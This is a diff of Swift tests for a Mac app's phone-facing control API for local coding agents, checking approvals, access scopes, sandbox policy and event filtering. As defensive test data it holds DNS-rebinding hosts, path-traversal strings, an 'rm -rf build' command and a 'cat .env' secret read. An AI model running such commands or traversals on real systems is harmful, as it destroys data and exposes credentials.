+        await #expect(throws: AgentSessionError.unknownModel("evil/model")) {
+            try await model.sendAgentMessage(engine: "pi", .init(text: "hi", model: "evil/model"))
+        }
+
+        // And a stopped engine is a 409 that says how to start it, not a silent nothing.
+        model.codexState = .idle
+        await #expect(throws: AgentSessionError.notRunning("codex")) {
+            try await model.sendAgentMessage(engine: "codex", .init(text: "Hello"))
+        }
+        await #expect(throws: AgentSessionError.unknownEngine("claude")) {
+            try await model.sendAgentMessage(engine: "claude", .init(text: "Hello"))
+        }
+    }
+
+    /// An engine that says it is running but whose sidecar has gone underneath it drops the
+    /// message. Handing back the id of the row that happened to be last would tell a phone
+    /// its turn was accepted and point it at somebody else's row.
+    @Test func aSendThatReachedNothingIsRefusedRatherThanGivenSomebodyElsesRow() async throws {
+        let model = Self.freshModel()
+        // Ready, and no runtime behind it: `sendPiMessage` has nothing to send to.
+        model.piState = .ready
+        model.piItems = [AppModel.PiItem(kind: .assistant, text: "Earlier.")]
+
+        await #expect(throws: AgentSessionError.notRunning("pi")) {
+            try await model.sendAgentMessage(engine: "pi", .init(text: "Hello"))
+        }
+        #expect(model.piItems.count == 1)
+    }
+
+    // MARK: - Starting, stopping, new threads
+
+    /// The folder is the owner's to pick. A device that could name one could name any
+    /// folder on this Mac — and Codex is trusted inside whatever it is given.
+    @Test func aPhoneMayDriveCodexButNotChooseWhereItRuns() async throws {
+        let model = Self.freshModel()
+        #expect(model.hasExplicitCodexWorkingDirectory == false)
+
+        await #expect(throws: AgentSessionError.noWorkingDirectory) {
+            try await model.startAgentSession(engine: "codex")
+        }
+        // Nothing was started, and the reason says where to go rather than what to send.
+        #expect(model.codexState == .idle)
+        #expect(AgentSessionError.workingDirectoryIsTheMacsToPick.contains("on the Mac"))
+
+        // The session is still listed while it is stopped — a phone that cannot see it
+        // cannot offer to start it — and says nothing about a folder nobody chose.
+        let sessions = await model.agentSessions()
+        #expect(sessions.sessions.map(\.engine) == ControlAPI.agentEngines)
+        #expect(sessions.sessions.allSatisfy { $0.state == "stopped" })
+        let codex = try #require(sessions.sessions.first { $0.engine == "codex" })
+        #expect(codex.cwd == nil)
+        // Pi's workspace is the app's own, and is shown relative to the home folder: the
+        // account's name is nothing a phone needs.
+        let pi = try #require(sessions.sessions.first { $0.engine == "pi" })
+        #expect(pi.cwd?.hasPrefix("~/") == true)
+        #expect(pi.cwd?.contains(NSUserName()) == false)
+    }
+
+    /// Whether anything stands between the agent and the Mac, in the words a phone can act
+    /// on, for every combination that changes the answer.
+    @Test func theSummarySaysWhetherAnythingAsksBeforeTheAgentActs() async throws {
+        let model = Self.freshModel()
+        func summary(_ engine: String, guarded: Bool) async throws -> ControlAPI.AgentSessionSummary {
+            try await AgentSessionSeams.$guardrailsOn.withValue(guarded) {
+                try #require(await model.agentSessions().sessions.first { $0.engine == engine })
+            }
+        }
+        // Pi never asks on its own; the gate is the guardrail's.
+        #expect(try await summary("pi", guarded: true).approvals == "screened")
+        #expect(try await summary("pi", guarded: false).approvals == "unattended")
+        #expect(try await summary("pi", guarded: false).sandbox == "none")
+
+        // Codex asks under its default policy; the guardrail decides whether Jev looks first
+        // and pins full access down to the working folder.
+        model.settings.codexSandbox = "danger-full-access"
+        #expect(try await summary("codex", guarded: false).approvals == "asked")
+        #expect(try await summary("codex", guarded: false).sandbox == "danger-full-access")
+        #expect(try await summary("codex", guarded: true).approvals == "screened")
+        #expect(try await summary("codex", guarded: true).sandbox == "workspace-write")
+        // "Never ask" means nobody is asked — unless the guardrail pins it back.
+        model.settings.codexApprovalPolicy = "never"
+        #expect(try await summary("codex", guarded: false).approvals == "unattended")
+        #expect(try await summary("codex", guarded: true).approvals == "screened")
+
+        // A running thread keeps what it started with, whatever the settings say now.
+        model.codexThreadID = "th_never"
+        BuddyAgentSessions.shared.noteThreadPolicy(
+            owner: model.agentLedgerOwner, engine: "codex", threadID: "th_never",
+            approval: "never", sandbox: "read-only"
+        )
+        #expect(try await summary("codex", guarded: true).approvals == "unattended")
+        #expect(try await summary("codex", guarded: true).sandbox == "read-only")
+    }
+
+    /// The rule a new Codex thread starts under, moved into one function so the thread and
+    /// what a phone is told about it cannot disagree — pinned here, because it is the rule
+    /// that keeps the guardrail in the loop.
+    @Test func aNewCodexThreadStartsUnderTheRuleTheGuardrailNeeds() {
+        func policy(_ approval: String?, _ sandbox: String?, guarded: Bool) -> [String] {
+            let rule = AppModel.codexThreadPolicy(
+                storedApproval: approval, storedSandbox: sandbox, guarded: guarded
+            )
+            return [rule.approval, rule.sandbox]
+        }
+        // Nothing stored: ask before commands, read-only.
+        #expect(policy(nil, nil, guarded: false) == ["on-request", "read-only"])
+        // The owner's own choices stand while the guardrail is off…
+        #expect(policy("never", "danger-full-access", guarded: false)
+            == ["never", "danger-full-access"])
+        #expect(policy("untrusted", "workspace-write", guarded: false)
+            == ["untrusted", "workspace-write"])
+        // …and while it is on, the two that would stop Codex asking are pinned back.
+        #expect(policy("never", "danger-full-access", guarded: true)
+            == ["on-request", "workspace-write"])
+        #expect(policy("untrusted", "read-only", guarded: true) == ["on-request", "read-only"])
+        // Values an older build may have stored fall back rather than failing thread/start.
+        #expect(policy("sometimes", "everything", guarded: false) == ["on-request", "read-only"])
+    }
+
+    /// Pi's start from each state. From `failed` it is what the Mac's Retry does — never a
+    /// 200 that does nothing — and from `stopping` it is a refusal to wait.
+    @Test func startingPiFromEachStateDoesWhatTheMacWould() async throws {
+        #expect(AppModel.piStart(from: .idle) == .start)
+        #expect(AppModel.piStart(from: .failed("npx exited")) == .restart)
+        #expect(AppModel.piStart(from: .starting("Downloading…")) == .nothing)
+        #expect(AppModel.piStart(from: .ready) == .nothing)
+        #expect(AppModel.piStart(from: .stopping) == .refuse)
+
+        let model = Self.freshModel()
+        model.piState = .stopping
+        await #expect(throws: AgentSessionError.stillStopping("pi")) {
+            try await model.startAgentSession(engine: "pi")
+        }
+    }
+
+    /// A new thread from the phone is the Mac's own New Thread: the transcript it clears is
+    /// the one on screen, and the session it hands back is the one both sides now have.
+    @Test func aNewThreadFromThePhoneIsTheMacsOwnNewThread() async throws {
+        let model = Self.freshModel()
+        Self.run(codex: model)
+        model.codexRuntime = CodexRuntime()   // never started: the interrupt goes nowhere
+        model.codexThreadID = "th_01HZY"
+        model.codexItems = [CodexChatItem(id: "a1", kind: .assistant("Earlier."))]
+        model.codexApprovals = [CodexApproval(rpcID: .number(1), kind: .command("ls"))]
+        model.codexTurnActive = true
+        let before = try await model.agentSession(engine: "codex", query: .init())
+
+        let fresh = try await model.newAgentThread(engine: "codex")
+        #expect(fresh.itemCount == 0)
+        #expect(fresh.threadID == nil)
+        #expect(fresh.turnActive == false)
+        #expect(fresh.pendingApprovals == 0)
+        #expect(fresh.epoch != before.epoch)
+        // The Mac's own window, not a copy of it.
+        #expect(model.codexItems.isEmpty)
+
+        // Pi's is a real RPC command rather than a restart, so it needs a Pi to send it to.
+        model.piState = .ready
+        await #expect(throws: AgentSessionError.notRunning("pi")) {
+            try await model.newAgentThread(engine: "pi")
+        }
     }
 
     // MARK: - The routes, over a real socket
 
     /// Every new route reaches the host it is supposed to, with the parameters out of its
-    /// path — and `POST .../messages` answers 202 rather than 200, because the turn was
-    /// accepted and not answered.
+    /// path and query — and `POST .../messages` answers 202 rather than 200, with a reason
+    /// phrase that says so.
     @Test func everyRouteReachesTheHostWithItsParameters() async throws {
         try await withAgentServer { fixture in
             let phone = try await fixture.pair()
@@ -184,7 +935,7 @@ struct BuddyAgentSessionTests {
                 "GET", "/agent/sessions", token: phone.token
             ) == 200)
             #expect(try await fixture.phone.status(
-                "GET", "/agent/sessions/codex?since=12", token: phone.token
+                "GET", "/agent/sessions/codex?since=12&epoch=E1&limit=50", token: phone.token
             ) == 200)
             #expect(try await fixture.phone.status(
                 "POST", "/agent/sessions/codex/start", token: phone.token, body: "{}"
@@ -215,7 +966,7 @@ struct BuddyAgentSessionTests {
 
             #expect(await AgentCallLog.shared.calls == [
                 "sessions",
-                "session codex since=12",
+                "session codex since=12 epoch=E1 limit=50",
                 "start codex",
                 "new pi",
                 "interrupt codex",
@@ -224,18 +975,43 @@ struct BuddyAgentSessionTests {
                 "answer codex appr-1 decline",
             ])
 
+            // Transcripts go out without the indentation, which is a fifth of their bytes.
+            let (_, listed) = try await fixture.phone.call(
+                "GET", "/agent/sessions", token: phone.token
+            )
+            #expect(!String(decoding: listed, as: UTF8.self).contains("\n"))
+
             // An engine this Mac does not run is a 404 with a sentence, not a route that
-            // quietly matched nothing.
+            // quietly matched nothing — and a cursor that is not a number is a 400 rather
+            // than the whole transcript every time, which would hide the client's bug.
             let (missing, refusal) = try await fixture.phone.call(
                 "GET", "/agent/sessions/claude", token: phone.token
             )
             #expect(missing == 404)
             #expect(String(decoding: refusal, as: UTF8.self).contains("codex and pi"))
+            #expect(try await fixture.phone.status(
+                "GET", "/agent/sessions/codex?since=item_msg_1&epoch=E1", token: phone.token
+            ) == 400)
+            #expect(try await fixture.phone.status(
+                "GET", "/agent/sessions/codex?limit=lots", token: phone.token
+            ) == 400)
+
+            // 202 says its own name on the status line.
+            let payload = #"{"text":"hi"}"#
+            let accepted = try await rawHTTP(
+                port: fixture.local.port, session: fixture.local.session,
+                "POST /agent/sessions/codex/messages HTTP/1.1\r\nHost: 127.0.0.1\r\n"
+                + "Authorization: Bearer \(fixture.local.token)\r\n"
+                + "Content-Type: application/json\r\nContent-Length: \(payload.utf8.count)\r\n\r\n"
+                + payload
+            )
+            #expect(accepted.hasPrefix("HTTP/1.1 202 Accepted"))
         }
     }
 
     /// The gate, on every one of them: full control only, never a chat-only phone, never a
-    /// peer, never an unauthenticated caller.
+    /// peer, never an unauthenticated caller, and never this Mac's own token from out on
+    /// the tailnet.
     @Test func theAgentRoutesAreFullScopeAndNeverThePeers() async throws {
         try await withAgentServer(swarmToken: Self.swarmSecret) { fixture in
             let full = try await fixture.pair(name: "Studio phone")
@@ -267,12 +1043,16 @@ struct BuddyAgentSessionTests {
                     "\(method) \(path)"
                 )
 
-                // No token at all, and a token that is not one.
+                // No token at all, a token that is not one, and this Mac's own token on
+                // the tailnet listener — where it is not a credential at all.
                 #expect(try await fixture.phone.status(
                     method, path, token: nil, body: body
                 ) == 401, "\(method) \(path)")
                 #expect(try await fixture.phone.status(
                     method, path, token: "guessed", body: body
+                ) == 401, "\(method) \(path)")
+                #expect(try await fixture.phone.status(
+                    method, path, token: fixture.phone.token, body: body
                 ) == 401, "\(method) \(path)")
 
                 // And the two credentials that do pass: a full-control phone out on the
@@ -287,395 +1067,185 @@ struct BuddyAgentSessionTests {
         }
     }
 
-    // MARK: - The race
-
-    /// The one that matters: the owner answers an approval at the Mac, the phone's tap is
-    /// already in flight, and the runtime must be told exactly once.
-    ///
-    /// `forwardedAnswers` counts every time a device's answer is forwarded to a runtime —
-    /// `CodexRuntime.respond`, or Pi's `extension_ui_response` — and
-    /// `answerAgentApproval` is the only path a device has to either. A change that let
-    /// the second answer through moves that number, and this fails.
-    @Test func anApprovalAnsweredAtTheMacIsNeverForwardedTwice() async throws {
-        let model = AppModel(settings: .init())
-        BuddyAgentSessions.shared.forget(model)
-        model.codexState = .ready(endpoint: URL(string: "codex://app-server")!)
-        let approval = CodexApproval(rpcID: .number(7), kind: .command("rm -rf build"))
-        model.codexApprovals = [approval]
-
-        // The phone has seen the card and is about to answer it.
-        let waiting = try await model.agentSession(engine: "codex", since: nil)
-        #expect(waiting.approvals.map(\.id) == [approval.id.uuidString])
-
-        // The owner gets there first.
-        model.answerCodexApproval(approval, accept: true)
-        #expect(model.codexApprovals.isEmpty)
-
-        await #expect(throws: AgentSessionError.answeredOnTheMac(approval.id.uuidString)) {
-            try await model.answerAgentApproval(
-                engine: "codex", id: approval.id.uuidString, decision: "decline"
-            )
+    /// The loopback listener's second lock: a page that rebinds its own name to 127.0.0.1
+    /// still sends its own name as the `Host`.
+    @Test func aRebindingHostIsRefusedOnTheLoopbackListener() async throws {
+        try await withAgentServer { fixture in
+            for host in ["attacker.example", "attacker.example:80", "127.0.0.1.attacker.example"] {
+                let answer = try await rawHTTP(
+                    port: fixture.local.port, session: fixture.local.session,
+                    "GET /agent/sessions HTTP/1.1\r\nHost: \(host)\r\n"
+                    + "Authorization: Bearer \(fixture.local.token)\r\n\r\n"
+                )
+                #expect(answer.hasPrefix("HTTP/1.1 403"), "\(host)")
+                #expect(answer.contains(ControlServer.agentsAreForLoopbackHosts), "\(host)")
+            }
+            // Loopback names pass.
+            for host in ["127.0.0.1", "localhost:8080", "[::1]"] {
+                let answer = try await rawHTTP(
+                    port: fixture.local.port, session: fixture.local.session,
+                    "GET /agent/sessions HTTP/1.1\r\nHost: \(host)\r\n"
+                    + "Authorization: Bearer \(fixture.local.token)\r\n\r\n"
+                )
+                #expect(answer.hasPrefix("HTTP/1.1 200"), "\(host)")
+            }
         }
-        // Nothing was sent. Not "sent and ignored" — not sent.
-        #expect(BuddyAgentSessions.shared.forwardedAnswers(of: model) == 0)
     }
 
-    /// The other way round, and the second tap after it.
-    @Test func aPhonesAnswerIsForwardedOnceAndThenTheCardIsGone() async throws {
-        let model = AppModel(settings: .init())
-        BuddyAgentSessions.shared.forget(model)
-        model.codexState = .ready(endpoint: URL(string: "codex://app-server")!)
-        let approval = CodexApproval(rpcID: .number(7), kind: .command("swift test"))
-        model.codexApprovals = [approval]
-        let id = approval.id.uuidString
+    /// Path oddities reach nothing.
+    @Test func pathOdditiesReachNothing() async throws {
+        try await withAgentServer { fixture in
+            let phone = try await fixture.pair()
+            for path in [
+                "/agent/sessions/CODEX", "/agent/sessions/codex%2F..", "/agent/sessions/..",
+                "/agent/sessions/codex/../pi", "//agent//sessions//harness",
+            ] {
+                let status = try await fixture.phone.status("GET", path, token: phone.token)
+                #expect(status == 404 || status == 400, "\(path) -> \(status)")
+            }
+        }
+    }
 
-        let answered = try await model.answerAgentApproval(
-            engine: "codex", id: id, decision: "accept"
+    // MARK: - The side channel
+
+    /// The filter itself, with every audience at once — which is what makes it
+    /// mutation-proof: were it removed, the chat-only phone and the swarm would receive
+    /// the very frames the other two are shown receiving here.
+    @Test func agentFramesReachOnlyThisMacAndFullControlDevices() async throws {
+        let hub = BuddyEventHub()
+        let mac = await hub.subscribe(as: .thisMac)
+        let full = await hub.subscribe(as: .device(id: "phone", scope: .full))
+        let chat = await hub.subscribe(as: .device(id: "lent-out", scope: .chat))
+        let peer = await hub.subscribe(as: .peer)
+        #expect(await hub.agentAudienceCount == 2)
+
+        let secret = ControlAPI.AgentEvent(
+            engine: "codex", kind: "item", seq: 1, epoch: "e",
+            item: .init(id: "c1", kind: "command", text: "cat .env",
+                        output: "API_KEY=placeholder", at: "2026-09-19T10:00:00Z")
         )
-        #expect(answered.decision == "accepted")
-        #expect(answered.session.pendingApprovals == 0)
-        #expect(BuddyAgentSessions.shared.forwardedAnswers(of: model) == 1)
-        // The card goes at once, on the Mac as well: a decision has been made, and a card
-        // still on screen would be a lie about what is still pending.
-        #expect(model.codexApprovals.isEmpty)
+        await hub.post(.agent(secret))
+        await hub.post(.heartbeat(.init(at: "2026-09-19T10:00:01Z")))
+        for subscription in [mac, full, chat, peer] { await hub.cancel(subscription.id) }
 
-        // A second tap — a retry on a bad connection, a stale screen. Not 409: the Mac did
-        // not answer this, the last request did, and nothing else was decided here.
-        await #expect(throws: AgentSessionError.unknownApproval(id)) {
-            try await model.answerAgentApproval(engine: "codex", id: id, decision: "accept")
+        func names(_ stream: AsyncStream<BuddyEvent.Frame>) async -> [String] {
+            var seen: [String] = []
+            for await frame in stream { seen.append(frame.name) }
+            return seen
         }
-        #expect(BuddyAgentSessions.shared.forwardedAnswers(of: model) == 1)
-
-        // A decision that is not one never reaches the approval at all.
-        await #expect(throws: AgentSessionError.unknownDecision("maybe")) {
-            try await model.answerAgentApproval(engine: "codex", id: id, decision: "maybe")
-        }
-        #expect(BuddyAgentSessions.shared.forwardedAnswers(of: model) == 1)
+        #expect(await names(mac.stream) == ["agent", "heartbeat"])
+        #expect(await names(full.stream) == ["agent", "heartbeat"])
+        // Everything else still arrives — only the transcript is withheld.
+        #expect(await names(chat.stream) == ["heartbeat"])
+        #expect(await names(peer.stream) == ["heartbeat"])
     }
 
-    /// A card that goes away without anybody answering it — a stopped engine, a restart, a
-    /// sidecar that died. Nothing will run, so the phone's card comes down saying
-    /// `declined`; but nobody answered first, so a tap that lands afterwards is a 404 and
-    /// not a 409 about a decision that was never made.
-    @Test func anApprovalTheEngineTookWithItIsGoneRatherThanAnswered() async throws {
-        let model = AppModel(settings: .init())
-        BuddyAgentSessions.shared.forget(model)
-        model.codexState = .ready(endpoint: URL(string: "codex://app-server")!)
-        let approval = CodexApproval(rpcID: .number(9), kind: .command("swift build"))
-        model.codexApprovals = [approval]
-        let id = approval.id.uuidString
-        _ = Self.settle(model, engine: "codex")
-
-        // What `handleCodexEvent(.terminated)` does when the sidecar exits under a turn.
-        model.codexApprovals.removeAll()
-        model.codexTurnActive = false
-        #expect(Self.states(Self.settle(model, engine: "codex")) == ["declined"])
-
-        await #expect(throws: AgentSessionError.unknownApproval(id)) {
-            try await model.answerAgentApproval(engine: "codex", id: id, decision: "accept")
+    /// A subscriber that falls behind is told, rather than left holding a stream with a
+    /// hole in it.
+    @Test func aSubscriberThatFallsBehindIsToldToResync() async throws {
+        let hub = BuddyEventHub()
+        let slow = await hub.subscribe(as: .device(id: "phone", scope: .full))
+        let overflow = BuddyEventHub.bufferedFrames + 8
+        for index in 0..<overflow {
+            await hub.post(.heartbeat(.init(at: "2026-09-19T10:00:\(String(format: "%02d", index % 60))Z")))
         }
-        #expect(BuddyAgentSessions.shared.forwardedAnswers(of: model) == 0)
+        await hub.cancel(slow.id)
+        var frames: [BuddyEvent.Frame] = []
+        for await frame in slow.stream { frames.append(frame) }
+        #expect(frames.count == BuddyEventHub.bufferedFrames)
+        // The newest frame is the one that says so, and it says how many were lost.
+        let last = try #require(frames.last)
+        #expect(last.name == "resync")
+        let resync = try JSONDecoder().decode(ControlAPI.ResyncEvent.self, from: last.data)
+        #expect(resync.dropped >= 1)
     }
 
-    /// Pi's half of the same rule. Its cards stay in the transcript once answered, so the
-    /// race is detected differently and has to come out the same.
-    @Test func piApprovalsFollowTheSameRule() async throws {
-        let model = AppModel(settings: .init())
-        BuddyAgentSessions.shared.forget(model)
-        model.piState = .ready
-        let card = AppModel.PiItem(
-            kind: .approval(requestID: "ui-1", tool: "bash"),
-            text: #"{"command":"rm -rf build"}"#, running: true
-        )
-        model.piItems = [card]
-        let id = card.id.uuidString
-
-        _ = try await model.agentSession(engine: "pi", since: nil)
-        model.answerPiApproval(card, allow: false)
-
-        await #expect(throws: AgentSessionError.answeredOnTheMac(id)) {
-            try await model.answerAgentApproval(engine: "pi", id: id, decision: "accept")
+    /// Opening frames go to the phone that just arrived, and to nobody else — and a
+    /// running watcher neither repeats what an older subscriber has nor misses what
+    /// changes after a newcomer's opening.
+    @Test func theWatcherOpensEachNewcomerAndThenSendsOnlyWhatChanged() async throws {
+        let model = Self.freshModel()
+        Self.run(codex: model)
+        let hub = BuddyEventHub()
+        let pump = AgentEventPump()
+        defer { pump.stop() }
+        let first = await hub.subscribe(as: .device(id: "phone", scope: .full))
+        pump.start(watching: model, hub: hub, interval: .milliseconds(20))
+        let received = AgentFrames()
+        let collecting = Task {
+            for await frame in first.stream {
+                if let event = Self.decodeAgent(frame) { received.append(event) }
+            }
         }
-        #expect(BuddyAgentSessions.shared.forwardedAnswers(of: model) == 0)
+        defer { collecting.cancel() }
+
+        // Both engines, state and turn each, before anything else.
+        #expect(try await received.waitFor { $0.count >= 4 })
+        let opening = Array(received.events.prefix(4))
+        #expect(opening.map(\.kind) == ["state", "turn", "state", "turn"])
+        #expect(Set(opening.map(\.engine)) == Set(ControlAPI.agentEngines))
+
+        model.codexItems.append(CodexChatItem(id: "a1", kind: .assistant("Hello.")))
+        #expect(try await received.waitFor { $0.contains { $0.kind == "item" } })
+        let changed = received.events.first { $0.kind == "item" }
+        #expect(changed?.item?.id == "a1")
+        // Never backwards, for this subscriber, from its opening onwards.
+        let codexSeqs = received.events.filter { $0.engine == "codex" }
+        #expect(codexSeqs.map(\.seq) == codexSeqs.map(\.seq).sorted())
+        await hub.cancel(first.id)
     }
 
-    // MARK: - Catching up
-
-    /// A phone that lost its stream asks for what it missed, and gets that and nothing
-    /// else — by sequence or by the id of the last row it actually has.
-    @Test func sinceHandsBackOnlyWhatAPhoneHasNotSeen() async throws {
-        let model = AppModel(settings: .init())
-        BuddyAgentSessions.shared.forget(model)
-        model.codexState = .ready(endpoint: URL(string: "codex://app-server")!)
-        model.codexItems = [CodexChatItem(id: "a1", kind: .assistant("First."))]
-
-        let first = try await model.agentSession(engine: "codex", since: nil)
-        #expect(first.items.map(\.id) == ["a1"])
-        #expect(first.complete)
-
-        model.codexItems.append(CodexChatItem(id: "a2", kind: .assistant("Second.")))
-        let caught = try await model.agentSession(
-            engine: "codex", since: String(first.seq)
-        )
-        #expect(caught.items.map(\.id) == ["a2"])
-        #expect(caught.complete == false)
-        #expect(caught.seq > first.seq)
-
-        // An id works as well as a number, which is what a phone has after a plain GET.
-        let byID = try await model.agentSession(engine: "codex", since: "a1")
-        #expect(byID.items.map(\.id) == ["a2"])
-
-        // A row that changes is newer again — text that grew while the phone was away is
-        // not "already seen" because its id is.
-        model.codexItems[0].kind = .assistant("First, revised.")
-        let revised = try await model.agentSession(
-            engine: "codex", since: String(caught.seq)
-        )
-        #expect(revised.items.map(\.id) == ["a1"])
-        #expect(revised.items.first?.text == "First, revised.")
-
-        // Nothing moved since: an empty slice, not the transcript again.
-        let quiet = try await model.agentSession(
-            engine: "codex", since: String(revised.seq)
-        )
-        #expect(quiet.items.isEmpty)
-        #expect(quiet.complete == false)
-
-        // A sequence this session never reached, and an id it does not know, are both a
-        // caller asking to continue from nowhere. The honest answer is the whole
-        // transcript, and `complete` is how it says so rather than leaving a silent gap.
-        for nonsense in ["99999", "no-such-item", "-4"] {
-            let whole = try await model.agentSession(engine: "codex", since: nonsense)
-            #expect(whole.items.map(\.id) == ["a1", "a2"], "since=\(nonsense)")
-            #expect(whole.complete, "since=\(nonsense)")
+    /// Nothing is sampled for an audience that may not see it.
+    @Test func theWatcherDoesNotRunForAChatOnlyOrPeerAudience() async throws {
+        let model = Self.freshModel()
+        let hub = BuddyEventHub()
+        let pump = AgentEventPump()
+        defer { pump.stop() }
+        let chat = await hub.subscribe(as: .device(id: "lent-out", scope: .chat))
+        let peer = await hub.subscribe(as: .peer)
+        pump.start(watching: model, hub: hub, interval: .milliseconds(10))
+        let deadline = ContinuousClock.now + .seconds(2)
+        while pump.isRunning, ContinuousClock.now < deadline {
+            try await Task.sleep(for: .milliseconds(10))
         }
-
-        // And a new thread is the same situation: what came before cannot be caught up,
-        // only replaced.
-        let beforeTheNewThread = try await model.agentSession(engine: "codex", since: nil)
-        model.newCodexThread()
-        model.codexItems = [CodexChatItem(id: "b1", kind: .assistant("Fresh."))]
-        let afterwards = try await model.agentSession(
-            engine: "codex", since: String(beforeTheNewThread.seq)
-        )
-        #expect(afterwards.items.map(\.id) == ["b1"])
-        #expect(afterwards.complete)
-    }
-
-    // MARK: - Frames
-
-    /// A model writing a hundred tokens a second must not become a hundred frames a second.
-    ///
-    /// The rule is the sampling, so this is what it looks like: the ledger is reconciled as
-    /// often as anything asks — routes do, constantly — and the watcher emits one frame per
-    /// row per reading. Twenty deltas between two readings are one frame carrying the row
-    /// whole, which is also why a phone that misses one has missed nothing.
-    @Test func streamedProseIsCoalescedIntoOneFramePerReading() throws {
-        let model = AppModel(settings: .init())
-        BuddyAgentSessions.shared.forget(model)
-        model.codexState = .ready(endpoint: URL(string: "codex://app-server")!)
-        model.codexItems = [CodexChatItem(id: "a1", kind: .assistant(""))]
-
-        // The first reading is the opening one: state and turn, so a phone that has just
-        // connected has something true before any delta means anything.
-        let opening = try #require(model.agentSnapshot(engine: "codex"))
-        BuddyAgentSessions.shared.reconcile(opening)
-        let first = BuddyAgentSessions.shared.frames(from: opening)
-        #expect(Self.kinds(first) == ["state", "turn"])
-
-        var text = ""
-        for token in ["Start ", "in ", "Alfama, ", "early."] {
-            text += token
-            model.codexItems[0].kind = .assistant(text)
-            // Every route that touches this engine reconciles; none of them posts.
-            BuddyAgentSessions.shared.reconcile(
-                try #require(model.agentSnapshot(engine: "codex"))
-            )
-        }
-
-        let sampled = try #require(model.agentSnapshot(engine: "codex"))
-        BuddyAgentSessions.shared.reconcile(sampled)
-        let frames = BuddyAgentSessions.shared.frames(from: sampled)
-        #expect(Self.kinds(frames) == ["item"])
-        guard case .agent(let event) = frames[0] else {
-            Issue.record("expected an agent frame")
-            return
-        }
-        // The row whole, not the last delta.
-        #expect(event.item?.text == "Start in Alfama, early.")
-        #expect(event.item?.id == "a1")
-        // And the sampling rate is the promise: ten readings a second, per engine.
-        #expect(AgentEventPump.interval == .milliseconds(100))
-
-        // Nothing moved: nothing said.
-        BuddyAgentSessions.shared.reconcile(sampled)
-        #expect(BuddyAgentSessions.shared.frames(from: sampled).isEmpty)
-    }
-
-    /// The Mac's own doing, on the phone: the owner's send, the owner's approval, the
-    /// turn starting and ending.
-    @Test func whatTheOwnerDoesAtTheMacBecomesFramesToo() throws {
-        let model = AppModel(settings: .init())
-        BuddyAgentSessions.shared.forget(model)
-        model.codexState = .ready(endpoint: URL(string: "codex://app-server")!)
-        _ = Self.settle(model, engine: "codex")
-
-        // The owner types into the Mac's own window.
-        model.codexItems.append(CodexChatItem(id: "u1", kind: .user("Fix the test.")))
-        model.codexTurnActive = true
-        let typed = Self.settle(model, engine: "codex")
-        #expect(Self.kinds(typed) == ["turn", "item"])
-
-        // Codex asks, and the card appears on both screens.
-        let approval = CodexApproval(rpcID: .number(7), kind: .command("swift test"))
-        model.codexApprovals = [approval]
-        let asked = Self.settle(model, engine: "codex")
-        #expect(Self.kinds(asked) == ["approval"])
-        #expect(Self.states(asked) == ["pending"])
-
-        // The owner answers it at the Mac. The phone's card has to go away by itself, and
-        // say which way it went — that frame is the whole of "answered on either side
-        // resolves on both".
-        model.answerCodexApproval(approval, accept: true)
-        let answered = Self.settle(model, engine: "codex")
-        #expect(Self.kinds(answered) == ["approval"])
-        #expect(Self.states(answered) == ["accepted"])
-
-        // A declined one says so too, rather than both ending as "gone".
-        let second = CodexApproval(rpcID: .number(8), kind: .command("rm -rf build"))
-        model.codexApprovals = [second]
-        _ = Self.settle(model, engine: "codex")
-        model.answerCodexApproval(second, accept: false)
-        #expect(Self.states(Self.settle(model, engine: "codex")) == ["declined"])
-
-        // And the engine going down is one frame, not a silence a phone has to time out on.
-        model.codexTurnActive = false
-        model.codexState = .failed(message: "Codex exited unexpectedly.")
-        let died = Self.settle(model, engine: "codex")
-        #expect(Self.kinds(died) == ["state", "turn"])
-        #expect(Self.states(died) == ["failed"])
-    }
-
-    // MARK: - What a phone may not do
-
-    /// The folder is the owner's to pick. A device that could name one could name any
-    /// folder on this Mac — and Codex is trusted inside whatever it is given.
-    @Test func aPhoneMayDriveCodexButNotChooseWhereItRuns() async throws {
-        let model = AppModel(settings: .init())
-        BuddyAgentSessions.shared.forget(model)
-        #expect(model.hasExplicitCodexWorkingDirectory == false)
-
-        await #expect(throws: AgentSessionError.noWorkingDirectory) {
-            try await model.startAgentSession(engine: "codex")
-        }
-        // Nothing was started, and the reason says where to go rather than what to send.
-        #expect(model.codexState == .idle)
-        #expect(AgentSessionError.workingDirectoryIsTheMacsToPick.contains("on the Mac"))
-
-        // The session is still listed while it is stopped — a phone that cannot see it
-        // cannot offer to start it — and it carries a model list to pick from.
-        let sessions = await model.agentSessions()
-        #expect(sessions.sessions.map(\.engine) == ControlAPI.agentEngines)
-        #expect(sessions.sessions.allSatisfy { $0.state == "stopped" })
-        #expect(sessions.sessions.allSatisfy { !$0.cwd.isEmpty })
-    }
-
-    /// A model that is not on the list is refused before the engine is asked, rather than
-    /// a turn quietly answered by a different model than the one on screen.
-    @Test func aTurnCannotBeSentWithAModelThisSessionDoesNotHave() async throws {
-        let model = AppModel(settings: .init())
-        BuddyAgentSessions.shared.forget(model)
-        model.codexState = .ready(endpoint: URL(string: "codex://app-server")!)
-
-        await #expect(throws: AgentSessionError.unknownModel("gpt-5")) {
-            try await model.sendAgentMessage(
-                engine: "codex", .init(text: "Hello", model: "gpt-5")
-            )
-        }
-        await #expect(throws: AgentSessionError.emptyMessage) {
-            try await model.sendAgentMessage(engine: "codex", .init(text: "   \n "))
-        }
-        // Nothing reached the transcript on either refusal.
-        #expect(model.codexItems.isEmpty)
-
-        // And a stopped engine is a 409 that says how to start it, not a silent nothing.
-        model.codexState = .idle
-        await #expect(throws: AgentSessionError.notRunning("codex")) {
-            try await model.sendAgentMessage(engine: "codex", .init(text: "Hello"))
-        }
-        await #expect(throws: AgentSessionError.unknownEngine("claude")) {
-            try await model.sendAgentMessage(engine: "claude", .init(text: "Hello"))
-        }
-    }
-
-    /// An engine that says it is running but whose sidecar has gone underneath it drops the
-    /// message. Handing back the id of the row that happened to be last would tell a phone
-    /// its turn was accepted and point it at somebody else's row.
-    @Test func aSendThatReachedNothingIsRefusedRatherThanGivenSomebodyElsesRow() async throws {
-        let model = AppModel(settings: .init())
-        BuddyAgentSessions.shared.forget(model)
-        // Ready, and no runtime behind it: `sendPiMessage` has nothing to send to.
-        model.piState = .ready
-        model.piItems = [AppModel.PiItem(kind: .assistant, text: "Earlier.")]
-
-        await #expect(throws: AgentSessionError.notRunning("pi")) {
-            try await model.sendAgentMessage(engine: "pi", .init(text: "Hello"))
-        }
-        #expect(model.piItems.count == 1)
-    }
-
-    /// A new thread from the phone is the Mac's own New Thread: the transcript it clears is
